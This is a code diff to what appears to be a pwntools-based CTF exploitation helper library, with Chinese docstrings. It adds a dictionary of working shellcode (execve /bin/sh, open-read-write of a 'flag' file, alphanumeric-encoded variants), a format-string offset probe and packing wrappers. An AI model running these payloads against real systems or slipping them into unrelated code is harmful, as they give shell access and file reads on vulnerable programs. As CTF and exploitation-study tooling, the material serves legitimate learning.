+def fmtstraux(size: Optional[int] = 10) -> Optional[int]:
     """
     快速获取格式化字符串对应的偏移。
 
     Args:
         size (int): 几个%p，默认为10。
-        x64 (bool): 是否是64位。
-
-    Returns:
-        int: 格式化字符串偏移，若未找到则会抛出报错。
     """
     global ioStream
+    global arch
 
-    check_io_stream(ioStream)
+    _check_io_stream(ioStream)
 
     if size is None:
         size = 10
 
-    if x64 is True:
-        strsize = 8
-    else:
-        strsize = 4
+    strsize = 8 if arch == Arch.x64 else 4
 
     Payload = b'A' * strsize + b'-%p' * size
     ioStream.sendline(Payload)
-    temp = ioStream.recvline()
+    temp = ioStream.recvall(timeout=0.2)
     pattern = re.compile(r'(0x[0-9a-fA-F]+|\(nil\))(?:-|$)')
     matches = pattern.findall(temp.decode())
 
     if matches:
         position = 0
         for match in matches:
-            if match == b'(nil)':
+            if match == '(nil)':
                 position += 1
             else:
                 position += 1
-                if x64 is True:
-                    if match == '0x4141414141414141':
-                        return position
-                else:
-                    if match == '0x41414141':
-                        return position
+                hex_value = match[2:] if match.startswith('0x') else match
+                
+                if arch == Arch.x64:
+                    if '41414141' in hex_value:
+                        _colorful_print(f"Found offset at {position}.")
+                        return
+                elif arch == Arch.x86:
+                    if '41414' in hex_value:
+                        _colorful_print(f"Found offset at {position}.")
+                        return
 
-        raise RuntimeError("Offset not found. Please incrase the size or check manually.")
-
+        raise Exception("Offset not found. Please increase the size or check manually.")
     else:
-        raise RuntimeError("Unknown Error.")
+        raise Exception("Unknown Error.")
 
 
 def fmtgen(character=None, size=None, num=None, separator=None):
@@ -718,7 +1268,230 @@ class IO_FILE_plus_struct(FileStructure):
         self.unknown2 |= (value << off)
 
 
-import ctypes
+shellcode_list = {
+    "execve_x86": b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80',
+    "execve_x64": b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05',
+    "execveat_x64": b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05',
+    "execve_binsh_x64": b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05',
+    "orw_x64": b'\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05',
+    "orw_x86": b'\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80',
+    "alpha3_x64": b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t',
+    "alpha3_x86": b'hffffk4diFkTpj02Tpk0T0AuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0s',
+    "ae64": b'WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP',
+}
+
+
+def get_shellcode(type='execve'):
+    """
+    返回现有的 Shellcode
+
+    execve, orw, alpha3, ae64
+    Args:
+        type: Shellcode 类型，默认 execve
+
+    Returns:
+        shellcode
+    """
+    global arch
+
+    color = random_color()
+
+    shellcode_key = f"{type}_{'x64' if arch == Arch.x64 else 'x86'}"
+    if shellcode_key in shellcode_list:
+        _colorful_print(f"Try get shellcode from shellcode list with type:{type}, Arch:{arch}", color)
+        _colorful_print(f"Shellcode: {shellcode_list[shellcode_key]}", color)
+        return shellcode_list[shellcode_key]
+    elif type in shellcode_list:
+        _colorful_print(f"Try get shellcode from shellcode list with type:{type}, Arch:{arch}", color)
+        _colorful_print(f"Shellcode: {shellcode_list[type]}", color)
+        return shellcode_list[type]
+    
+    raise ValueError(f"Unsupported shellcode type:{type} or architecture:{arch}.")
+
+
+def p64(
+    number: int,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Packs integer into wordsize of 64.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        number (int): Number to convert
+        endianness (str): Endianness of the converted integer ("little"/"big")
+        sign (bool): Signedness of the converted integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The packed number as a byte.
+    """
+    return pwnlib.util.packing.p64(number, endianness=endianness, sign=sign, **kwargs)
+
+
+def p32(
+    number: int,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Packs integer into wordsize of 32.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        number (int): Number to convert
+        endianness (str): Endianness of the converted integer ("little"/"big")
+        sign (bool): Signedness of the converted integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The packed number as a byte.
+    """
+    return pwnlib.util.packing.p32(number, endianness=endianness, sign=sign, **kwargs)
+
+
+def p16(
+    number: int,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Packs integer into wordsize of 16.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        number (int): Number to convert
+        endianness (str): Endianness of the converted integer ("little"/"big")
+        sign (bool): Signedness of the converted integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The packed number as a byte.
+    """
+    return pwnlib.util.packing.p16(number, endianness=endianness, sign=sign, **kwargs)
+
+
+def p8(
+    number: int,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Packs integer into wordsize of 8.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        number (int): Number to convert
+        endianness (str): Endianness of the converted integer ("little"/"big")
+        sign (bool): Signedness of the converted integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The packed number as a byte.
+    """
+    return pwnlib.util.packing.p8(number, endianness=endianness, sign=sign, **kwargs)
+
+
+def u64(
+    data: bytes,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Unpacks 64-bit integer from data.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        data (bytes): Data to unpack from
+        endianness (str): Endianness of the integer ("little"/"big")
+        sign (bool): Signedness of the integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The unpacked integer.
+    """
+    return pwnlib.util.packing.u64(data, endianness=endianness, sign=sign, **kwargs)
+
+
+def u32(
+    data: bytes,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Unpacks 32-bit integer from data.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        data (bytes): Data to unpack from
+        endianness (str): Endianness of the integer ("little"/"big")
+        sign (bool): Signedness of the integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The unpacked integer.
+    """
+    return pwnlib.util.packing.u32(data, endianness=endianness, sign=sign, **kwargs)
+
+
+def u16(
+    data: bytes,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Unpacks 16-bit integer from data.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        data (bytes): Data to unpack from
+        endianness (str): Endianness of the integer ("little"/"big")
+        sign (bool): Signedness of the integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The unpacked integer.
+    """
+    return pwnlib.util.packing.u16(data, endianness=endianness, sign=sign, **kwargs)
+
+
+def u8(
+    data: bytes,
+    endianness: Literal["little", "big"] = None,
+    sign: bool = None,
+    **kwargs: Any,
+):
+    """
+    Unpacks 8-bit integer from data.
+
+    endianness and signedness is done according to context.
+
+    Arguments:
+        data (bytes): Data to unpack from
+        endianness (str): Endianness of the integer ("little"/"big")
+        sign (bool): Signedness of the integer (False/True)
+        kwargs: Anything that can be passed to context.local
+
+    Returns:
+        The unpacked integer.
+    """
+    return pwnlib.util.packing.u8(data, endianness=endianness, sign=sign, **kwargs)
+
 
 class FileStruct(ctypes.Structure):
     _fields_ = [
@@ -726,3 +1499,21 @@ class FileStruct(ctypes.Structure):
         ('field2', ctypes.c_int),
         ('field3', ctypes.c_char * 10)
     ]
+
+
+class Arch(Enum):
+    x86 = 0,
+    x64 = 1,
+    Null = 255,
+
+
+class CheckStatement(Enum):
+    Normal = 0,
+    Missing = 1,
+    Null = 255,
+
+
+class SocketStatus(Enum):
+    Local = 0,
+    Remote = 1,
+    Null = 255,
